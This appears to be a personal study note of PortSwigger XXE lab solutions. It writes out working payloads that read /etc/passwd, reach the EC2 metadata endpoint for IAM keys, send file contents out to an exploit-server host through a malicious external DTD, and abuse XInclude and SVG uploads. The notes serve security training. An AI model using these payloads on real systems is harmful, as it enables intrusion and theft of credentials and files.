# Exploiting XXE using external entities to retrieve files

![[Pasted image 20230224012211.png]]

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxeefowj SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>
&xxeefowj;
</productId>
<storeId>1</storeId>
</stockCheck>
```

# Exploiting XXE to perform SSRF attacks

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

![[Pasted image 20230224022751.png]]
```XML
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]><stockCheck><productId>1&xxe;</productId><storeId>1</storeId></stockCheck>
```
![[Pasted image 20230224022824.png]]
![[Pasted image 20230224022839.png]]
![[Pasted image 20230224022849.png]]
![[Pasted image 20230224022904.png]]
![[Pasted image 20230224022947.png]]


# Exploiting blind XXE to exfiltrate data using a malicious external DTD

we create a entity to call for out-band site that's hosting our malicious DTD and make it return the value of the hosts file in the request

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0ac900700391629fc0da1788015a006e.exploit-server.net/?x=%file;'>">
```
![[Pasted image 20230224031349.png]]

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM

"https://exploit-0ac900700391629fc0da1788015a006e.exploit-server.net/exploit"> 

%xxe;

%eval;

%exfiltrate;]>

<stockCheck>
<productId>1</productId>
<storeId>1</storeId>
</stockCheck>
```
![[Pasted image 20230224031356.png]]
![[Pasted image 20230224031424.png]]

# Exploiting blind XXE to retrieve data via error messages
This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

![[Pasted image 20230224033057.png]]
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

![[Pasted image 20230224033117.png]]
```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM

"https://exploit-0a91002704e67828c3c63c790102003b.exploit-server.net/exploit"> 

%xxe;]>

<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

## OR 

![[Pasted image 20230224033152.png]]
```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM

"https://exploit-0a91002704e67828c3c63c790102003b.exploit-server.net/exploit"> 

%xxe;

%eval;

%error;]>

<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

# Exploiting XInclude to retrieve files
This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.

To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.
To perform an XInclude attack, you need to reference the XInclude namespace and provide the path to the file that you wish to include. For example:
`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
![[Pasted image 20230224033612.png]]

# Exploiting XXE via image file upload
![[Pasted image 20230224035132.png]]
[xxe exploit-db](https://www.exploit-db.com/docs/49732)
![[Pasted image 20230224035208.png]]
craft svg image with malicious code to retrieve the answer for the challenge
![[Pasted image 20230224035303.png]]
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY fetch SYSTEM "file:///etc/hostname">]>
<svg width="300px" height="200px" xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="23" x="8" y="28">&fetch;</text>
</svg>

```
![[Pasted image 20230224035325.png]]
![[Pasted image 20230224035332.png]]


# Exploiting XXE to retrieve data by repurposing a local DTD
This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the /etc/passwd file.

You'll need to reference an existing DTD file on the server and redefine an entity from it.

## Hint
Systems using the GNOME desktop environment often have a DTD at /usr/share/yelp/dtd/docbookx.dtd containing an entity called ISOamso.

![[Pasted image 20230224040543.png]]

---
Tags: #XXE #XML #burp #XXE_upload  #port_swigger 
Resources:
[Port Swigger](https://portswigger.net/web-security/xxe/blind)
[HackTricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
[DTD's exploits](Exploiting XXE to retrieve data by repurposing a local DTD)